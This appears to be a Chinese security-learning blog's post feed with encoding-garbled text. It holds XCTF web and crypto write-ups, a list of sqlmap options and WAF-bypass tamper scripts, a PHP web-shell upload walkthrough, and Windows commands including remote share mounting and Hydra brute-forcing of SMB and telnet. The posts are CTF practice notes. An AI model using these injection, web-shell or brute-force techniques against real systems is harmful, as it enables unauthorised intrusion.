href="https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/7a999d34.html">https://writeup.ctfhub.com/Skill/Web/ä¿¡æ¯æ³„éœ²/7a999d34.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ³¨å…¥å·¥å…·</title>
      <link href="2020/03/18/%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/"/>
      <url>2020/03/18/%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.cnblogs.com/twlr/p/12287293.html#_label0">https://www.cnblogs.com/twlr/p/12287293.html#_label0</a></p></blockquote><blockquote><p>åŸæ–‡ï¼šttps://<a href="http://www.cnblogs.com/twlr/p/12287293.html#_label0">www.cnblogs.com/twlr/p/12287293.html#_label0</a></p></blockquote><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmapå±äºæ¯”è¾ƒç»å…¸çš„ä¸€ä¸ªæ³¨å…¥å·¥å…·ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œè¿˜è‡ªå¸¦ä¸€äº›ç»•è¿‡å‚æ•°</p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u â€œurlâ€  å¯¹urlè¿æ¥è¿›è¡Œæ³¨å…¥æ£€æµ‹</span><br><span class="line"></span><br><span class="line">ç„¶åä½¿ç”¨æ³¨å…¥å‚æ•°è¿›è¡Œæ³¨å…¥</span><br><span class="line"></span><br><span class="line">-u  &#x2F;&#x2F;æ·»åŠ urlè¿›è¡Œæ£€æµ‹</span><br><span class="line"></span><br><span class="line">-dbs  &#x2F;&#x2F;è¿›è¡Œæ•°æ®åº“æ£€æµ‹</span><br><span class="line"></span><br><span class="line">-tables  &#x2F;&#x2F;çŒœè§£æ•°æ®åº“è¡¨</span><br><span class="line"></span><br><span class="line">-colums  &#x2F;&#x2F;çŒœè§£å­—æ®µ</span><br><span class="line"></span><br><span class="line">--level 1~5  &#x2F;&#x2F;è®¾ç½®æ³¨å…¥ç­‰çº§æœ€é«˜5çº§</span><br><span class="line"></span><br><span class="line">--risk  1~3  &#x2F;&#x2F;è®¾ç½®å±é™©ç­‰çº§</span><br><span class="line"></span><br><span class="line">--data  â€œå‚æ•°å†…å®¹â€   &#x2F;&#x2F;postæ³¨å…¥</span><br><span class="line"></span><br><span class="line">-r 1.txt  &#x2F;&#x2F;å¯¹1.txtå†…å®¹è¿›è¡Œæ³¨å…¥</span><br><span class="line"></span><br><span class="line">--delay  &#x2F;&#x2F;å»¶æ—¶</span><br></pre></td></tr></table></figure><p>sqlmapè‡ªå¸¦ç»•è¿‡è„šæœ¬temper</p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--temper è„šæœ¬åç§°</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºä¸€äº›è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py ç”¨UTF-8å…¨è§’å­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</span><br><span class="line">apostrophenullencode.py ç”¨éæ³•åŒå­—èŠ‚unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</span><br><span class="line">appendnullbyte.py åœ¨payloadæœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ç¼–ç </span><br><span class="line">base64encode.py å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨Base64ç¼–ç </span><br><span class="line">between.py åˆ†åˆ«ç”¨â€œNOT BETWEEN 0 AND #â€æ›¿æ¢å¤§äºå·â€œ&gt;â€ï¼Œâ€œBETWEEN # AND #â€æ›¿æ¢ç­‰äºå·â€œ&#x3D;â€</span><br><span class="line">bluecoat.py åœ¨SQLè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨â€œLIKEâ€æ›¿æ¢ç­‰äºå·â€œ&#x3D;â€</span><br><span class="line">chardoubleencode.py å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line">charencode.py å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line">charunicodeencode.py å¯¹ç»™å®šçš„payloadçš„éç¼–ç å­—ç¬¦ä½¿ç”¨Unicode URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line">concat2concatws.py ç”¨â€œCONCAT_WS(MID(CHAR(0), 0, 0), A, B)â€æ›¿æ¢åƒâ€œCONCAT(A, B)â€çš„å®ä¾‹</span><br><span class="line">equaltolike.py ç”¨â€œLIKEâ€è¿ç®—ç¬¦æ›¿æ¢å…¨éƒ¨ç­‰äºå·â€œ&#x3D;â€</span><br><span class="line">greatest.py ç”¨â€œGREATESTâ€å‡½æ•°æ›¿æ¢å¤§äºå·â€œ&gt;â€</span><br><span class="line">halfversionedmorekeywords.py åœ¨æ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ MySQLæ³¨é‡Š</span><br><span class="line">ifnull2ifisnull.py ç”¨â€œIF(ISNULL(A), B, A)â€æ›¿æ¢åƒâ€œIFNULL(A, B)â€çš„å®ä¾‹</span><br><span class="line">lowercase.py ç”¨å°å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦</span><br><span class="line">modsecurityversioned.py ç”¨æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</span><br><span class="line">modsecurityzeroversioned.py ç”¨å½“ä¸­å¸¦æœ‰æ•°å­—é›¶çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</span><br><span class="line">multiplespaces.py åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼</span><br></pre></td></tr></table></figure><h2 id="å•ŠD"><a href="#å•ŠD" class="headerlink" title="å•ŠD"></a>å•ŠD</h2><p>å•ŠDæ˜¯ä¸€ä¸ªå›¾å½¢åŒ–å·¥å…·ï¼Œç›´æ¥åœ¨ç›®æ ‡å‡ºè¾“å…¥urlåœ°å€å³å¯è¿›è¡Œè‡ªåŠ¨æ‰«æ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2900056067.png"></p><h2 id="æ˜å°å­"><a href="#æ˜å°å­" class="headerlink" title="æ˜å°å­"></a>æ˜å°å­</h2><p>æ˜å°å­ä¹Ÿæ˜¯ä¸€æ¬¾å›¾å½¢åŒ–å·¥å…·ä½¿ç”¨æ–¹æ³•å’Œå•ŠDç±»ä¼¼</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ³¨å…¥å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Webè¿›é˜¶åŒº</title>
      <link href="2020/03/15/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
      <url>2020/03/15/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>ç¬¬ä¸€æ­¥ï¼š<br>æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2500870734.png"></p><p>ç„¶åæ”¹ä¸ºå›¾ç‰‡æ ¼å¼åç¼€<br>ç¬¬äºŒï¼š<br>é€‰æ‹©ä¸Šä¼ æ–‡ä»¶ï¼Œå…ˆåˆ«æ€¥ç€ä¸Šä¼ ï¼Œæ‰“å¼€ burpsuite,ç„¶åæŠ“åŒ…æ”¹åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1388007942.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3480129909.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1387188277.png"></p><p>åç¼€æ”¹ä¸º phpï¼Œç„¶å Go</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/610521991.png"></p><p>å°±çœ‹è§ä¸Šä¼ è·¯å¾„äº†ï¼Œæœ€åèœåˆ€é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/676928215.png"></p><h2 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h2><p>è®¿é—®index.phpsï¼Œå‘ç°phpæºç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2193025587.png"></p><p>å®¡è®¡ä»£ç ï¼Œå‘ç°å‚æ•°id=adminè¦é€šè¿‡ä¸¤æ¬¡urlç¼–ç ï¼Œburpsuiteå¯ä»¥å®ç°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3708281185.png"></p><p>æœ€åè®¿é—®</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/435677933.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é»‘å®¢å¸¸ç”¨çš„DOSå‘½ä»¤</title>
      <link href="2020/03/14/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%9A%84DOS%E5%91%BD%E4%BB%A4/"/>
      <url>2020/03/14/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%9A%84DOS%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624376713.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ping +ç½‘å€ï¼šæŸ¥æ‰¾ç½‘å€IP</span><br><span class="line">ipconfig &#x2F;allï¼šæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚ç½‘å…³ï¼ŒDS....</span><br><span class="line">ipconfig &#x2F;?ï¼šåŠŸèƒ½</span><br><span class="line">ipconfig &#x2F;flushdnsï¼šåˆ·æ–°DNSè§£æç¼“å­˜</span><br><span class="line">systeminfoè¾ƒä¸ºå¸¸è§å¸¸ç”¨ï¼Œç”¨äºæŸ¥çœ‹è¡¥ä¸æƒ…å†µï¼Œç¡¬ä»¶ä¿¡æ¯ï¼Œç³»ç»Ÿç‰ˆæœ¬ï¼Œå®‰è£…æ—¶é—´....</span><br><span class="line">è‹¥æ— è¡¥ä¸ï¼Œåˆ™å¯ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·getrootå¾—çŸ¥å¯åˆ©ç”¨çš„æ¼æ´</span><br><span class="line">arp+-aï¼šæŸ¥çœ‹arpç¼“å­˜è¡¨ï¼ˆç°åœ¨éƒ½æ˜¯é€šè¿‡åŠ¨æ€è·å–çš„ï¼Œä¸è¶³ï¼šé€šè¿‡å¹¿æ’­è¿›å…¥åˆ°æœ¬åœ°çš„ï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2937642202.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shutdown+-aï¼šå–æ¶ˆ</span><br><span class="line">dir+c:\ :æŸ¥çœ‹Cç›˜ </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/999985613.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¸¦dirçš„éƒ½æ˜¯ç›®å½•ï¼Œå¸¦æ•°å­—çš„éƒ½æ˜¯æ–‡ä»¶ï¼ŒåŒæ—¶è¿˜å¯çœ‹åˆ°æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°</span><br><span class="line">dir &#x2F;aï¼šæŸ¥çœ‹éšè—ä¿¡æ¯</span><br><span class="line">cd .. ï¼šè¿”å›ä¸Šçº§ç›®å½•(..ï¼šè¡¨ç¤ºç›¸å¯¹äºä¸Šä¸€çº§) </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4004777264.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notepad+aaaa.txtï¼šæ‰“å¼€åä¸ºaaaa.txtçš„æ–‡æœ¬</span><br><span class="line">type+aaaa.txtï¼šåœ¨å‘½ä»¤è¡Œé‡Œè¯»å–æ–‡æœ¬ä¿¡æ¯</span><br><span class="line">del+aaaa.txtï¼šåˆ é™¤</span><br><span class="line">md+åå­—ï¼šåˆ›å»ºç›®å½•</span><br><span class="line">rd+åå­—ï¼šåˆ é™¤ç›®å½•</span><br><span class="line">ren+åŸå.txt   æ›´æ”¹å.txtï¼šé‡å‘½å </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2886487484.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy 1.txt d:\ ï¼šå°†1.txtæ–‡æœ¬å¤åˆ¶åˆ°Dç›˜</span><br><span class="line">telnet ip,ç„¶åè¾“å…¥è´¦å·å¯†ç ï¼šè¿œç¨‹è¿æ¥æ­¤IPçš„cmd</span><br><span class="line">telnetè¿˜å¯ä»¥æ¢æµ‹ä¸€äº›æœåŠ¡å™¨çš„ç«¯å£</span><br><span class="line">net use k:\\\ ip \c$ï¼šå°†æ­¤IPçš„Cç›˜æ‹¿èµ°ä½œä¸ºè‡ªå·±çš„Kç›˜</span><br></pre></td></tr></table></figure><p>è´¦å·å¯†ç (å±€åŸŸç½‘)å¯ç”¨å‘½ä»¤è¡Œå·¥å…·hydraçˆ†ç ´</p><p>smb(å¿«)ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1748283199.png"></p><p>telnet(æ…¢)ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3191985717.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stopï¼šè‹¥ä¸­é—´æœ‰ç©ºæ ¼ï¼Œåˆ™éœ€ä½¿ç”¨â€œâ€ </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2264889898.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1224845363.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -anï¼šæŸ¥çœ‹è¿æ¥æƒ…å†µï¼ˆå†…éƒ¨åœ°å€ä¸å¤–éƒ¨åœ°å€å“ªä¸ªç›¸è¿ï¼Œè¿æ¥çŠ¶æ€ï¼‰</span><br><span class="line">tasklist</span><br><span class="line">taskkillï¼šç»“æŸè¿›ç¨‹ (taskkill -f -im qq.exe)</span><br><span class="line">msg   ç”¨æˆ·å ä¿¡æ¯ ï¼šç»™è¯¥ç”¨æˆ·å‘æ¶ˆæ¯</span><br><span class="line">æ‰¹å¤„ç†ï¼šå¤šç»„å‘½ä»¤æ”¾åˆ°ä¸€ä¸ªbatæ–‡ä»¶é‡Œé¢ï¼Œä¿æŒä¸ºbatæ–‡ä»¶é€æ¡æ‰§è¡Œ</span><br><span class="line">æ‰¹å¤„ç†æ–‡ä»¶ï¼šDOSå‘½ä»¤çš„ç»„åˆæ–‡ä»¶ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘½ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Cryptoæ–°æ‰‹åŒº</title>
      <link href="2020/03/01/XCTF-Crypto%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
      <url>2020/03/01/XCTF-Crypto%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
      
        <content type="html"><![CDATA[<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>å…ˆæŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åbase64è§£å¯†ä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œso easy</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2863969933.png"></p><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p>åœ¨ä¸‹è½½çš„æ—¶å€™é¡ºä¾¿çœ‹çœ‹é¢˜ç›®<br>è¿™é¢˜ç›®æˆ‘æ˜¯çœ‹ä¸å‡ºæœ‰å•¥æç¤ºï¼Œçº¯å±çæ‰¯ï¼Œå¯¹äºèœé¸¡çš„æˆ‘åªèƒ½å¼€å§‹å°è¯•æ¥æŠŠå®ƒè¯•å‡ºæ¥ï¼Œæ— æœ<br>æœ€åè¿˜æ˜¯ç™¾åº¦äº†ä¸€ä¸‹wpçŸ¥é“ä»–æ˜¯keyä¸º12çš„å‡¯æ’’å¯†ç ï¼ˆemmmmï¼ŒCaesar==å‡¯æ’’ï¼Œä¸è¿‡key=12æˆ‘ä¹Ÿä¸æ¸…æ¥šå¤§ä½¬æ˜¯æ€ä¹ˆçœ‹å‡ºæ¥çš„â€¦ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/909570894.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/534878401.png"></p><p>é™„ä¸Šåœ°å€ï¼š<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><p>ä¸‹è½½çš„ç©ºé—²çœ‹çœ‹é¢˜ç›®</p><p>è¿™è¿˜æ˜¯æœ‰ç‚¹æç¤ºçš„ï¼Œå†çœ‹çœ‹æ–‡æ¡£</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4085632403.png"></p><p>å¥½å§ï¼Œè¿˜æ˜¯ç™¾åº¦ä¸€ä¸‹wp<br>åŸæ¥æ˜¯æ‘©æ–¯å¯†ç ï¼Œä¸æ„§æ˜¯å¤§ä½¬<br>æ‘©æ–¯å¯†ç  1æ›¿æ¢æˆ-,0æ›¿æ¢æˆ.,ç›´æ¥è§£å¯†</p><blockquote><p>11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</p><p>â€“ â€” .-. â€¦ . -.-. â€” -.. . .. â€¦ â€¦ â€” .. -. - . .-. . â€¦ - .. -. â€“.</p></blockquote><p>è§£å¯†å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/459369869.png"></p><p>é™„ä¸Šé“¾æ¥ï¼š<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>è´´å‡ºå¤§ä½¬çš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;&quot;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&quot;</span><br><span class="line">c&#x3D;c.replace(&quot;1&quot;,&quot;-&quot;)</span><br><span class="line">c&#x3D;c.replace(&quot;0&quot;,&quot;.&quot;)</span><br><span class="line">print (c)</span><br></pre></td></tr></table></figure><h2 id="æ··åˆç¼–ç "><a href="#æ··åˆç¼–ç " class="headerlink" title="æ··åˆç¼–ç "></a>æ··åˆç¼–ç </h2><p>è¾¹ä¸‹è½½è¾¹çœ‹é¢˜</p><p>æ‰“å¼€æ–‡æ¡£ä¸€çœ‹==å…«æˆæ˜¯base64ï¼Œäºæ˜¯å°±å¼€å§‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3600678099.png"></p><p>æ¥ç€å°±å¼€å§‹å„ç§å°è¯•ï¼Œç»“æœä¸€æ— æ‰€è·ï¼Œå—ä¸äº†ï¼Œè¿˜æ˜¯ç™¾åº¦wpçœ‹çœ‹..</p><p>çœ‹å®Œæç„¶å¤§æ‚Ÿï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1545849420.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1086529568.png"></p><p>é™„ä¸Šå¤§ä½¬ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#import re</span><br><span class="line">    r&#x3D;&quot;&#x2F;119&#x2F;101&#x2F;108&#x2F;99&#x2F;111&#x2F;109&#x2F;101&#x2F;116&#x2F;111&#x2F;97&#x2F;116&#x2F;116&#x2F;97&#x2F;99&#x2F;107&#x2F;97&#x2F;110&#x2F;100&#x2F;100&#x2F;101&#x2F;102&#x2F;101&#x2F;110&#x2F;99&#x2F;101&#x2F;119&#x2F;111&#x2F;114&#x2F;108&#x2F;100&quot;</span><br><span class="line">r&#x3D;re.split(&quot;&#x2F;&quot;,r)</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,len(r)):</span><br><span class="line">flag&#x3D;flag+chr(int(r[i]))</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><h2 id="å¹‚æ•°åŠ å¯†"><a href="#å¹‚æ•°åŠ å¯†" class="headerlink" title="å¹‚æ•°åŠ å¯†"></a>å¹‚æ•°åŠ å¯†</h2><p>è¾¹ä¸‹è¾¹çœ‹</p><p>æ‰“å¼€æ–‡æ¡£ä¸€è„¸æ‡µâ€¦<br>å¹‚æ•°åŠ å¯†ï¼Ÿï¼Ÿï¼Ÿç™¾åº¦çœ‹çœ‹è¿™ä¸ª<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B9%82%E6%95%B0%E5%8A%A0%E5%AF%86%E6%B3%95?fr=aladdin"><strong>å¹‚æ•°åŠ å¯†</strong></a><br>çœ‹å®Œå°±å¯ä»¥å¼€å§‹å†™è„šæœ¬æ¥è¿è¡Œçœ‹çœ‹ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/450938320.png"></p><p>é™„ä¸Šä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&quot;8842101220480224404014224202480122&quot;</span><br><span class="line">a&#x3D;a.split(&quot;0&quot;)</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">str &#x3D; a[i]</span><br><span class="line">list&#x3D;[]</span><br><span class="line">sum&#x3D;0</span><br><span class="line">for j in str:</span><br><span class="line">list.append(j)</span><br><span class="line">length &#x3D; len(list)</span><br><span class="line">for k in range(0,length):</span><br><span class="line">sum+&#x3D;int(list[k])</span><br><span class="line">flag+&#x3D;chr(sum+64)</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><p>çœ‹å®Œè¿™é¢˜ç›®ï¼Œæ„Ÿè§‰ä»–åº”è¯¥æ˜¯æç¤ºæˆ‘ä»¬æ˜¯æ …æ å¯†ç <br>ä¸‹å¥½é™„ä»¶ï¼Œæ‰“å¼€å°†å†…å®¹å¤åˆ¶ï¼Œè¿›è¡Œè§£å¯†<br>ä½†æ˜¯è¿™é‡Œæˆ‘å°è¯•äº†å¥½å¤šæ¬¡å¹¶æ²¡æœ‰å¾—å‡ºwpâ€¦<br>æ‰€ä»¥æˆ‘åˆå»çœ‹äº†çœ‹å¤§ä½¬ä»¬çš„wpï¼ŒåŸæ¥æ˜¯å› ä¸ºå›½å†…å¤–å¯¹æ …æ å¯†ç çš„åŠ å¯†åŸç†ç›¸åŒä½†å®é™…è¿‡ç¨‹æœ‰äº›ä¸åŒï¼Œè€Œè¿™é“é¢˜å°±éœ€è¦ç”¨å›½å¤–çš„è§£å¯†æ–¹æ³•æ¥è§£å¯†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1202160587.png"></p><p>é™„ä¸Šï¼š<br>å›½å†…è§£å¯† <a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a><br>å›½å¤–è§£å¯† <a href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a></p><h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>å…ˆç™¾åº¦çœ‹çœ‹<a href="https://baike.baidu.com/item/RSA%E7%AE%97%E6%B3%95/263310?fromtitle=RSA&fromid=210678&fr=aladdin"><strong>RSA</strong></a><br>çœ‹å¾—æœ‰ç‚¹æ™•â€¦<br>å·²çŸ¥p,q,eï¼Œæ±‚d<br>RSAè®¡ç®—è¿‡ç¨‹ï¼š<br>1.ä»»é€‰ä¸¤ä¸ªå¤§è´¨æ•°på’Œqï¼Œp!=qï¼Œè®¡ç®—N=pq<br>2.è®¡ç®—Nçš„æ¬§æ‹‰å‡½æ•°r(n)=(p-1)(q-1)<br>3.ä»»é€‰ä¸€ä¸ªeæ»¡è¶³ 1&lt;e&lt;r(n) ,ä¸”eä¸r(n)äº’è´¨<br>4.æ‰¾åˆ°dï¼Œä½¿e*d/r(n)=xâ€¦â€¦1ï¼ˆxæ˜¯å¤šå°‘ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯ä½™æ•°ä¸º1ï¼‰<br>5.è‡³æ­¤ï¼ˆnï¼Œeï¼‰ä¸ºå…¬é’¥ï¼Œï¼ˆnï¼Œdï¼‰ä¸ºç§é’¥<br>6.åŠ å¯†ï¼šC=M^e(mod n)ï¼›è§£å¯†ï¼šM=C^dï¼ˆmod nï¼‰<br>æœ€åç”¨æ¬§æ‹‰å‡½æ•°ç®—å‡ºflag<br>æ€»ç»“ï¼šåŠ 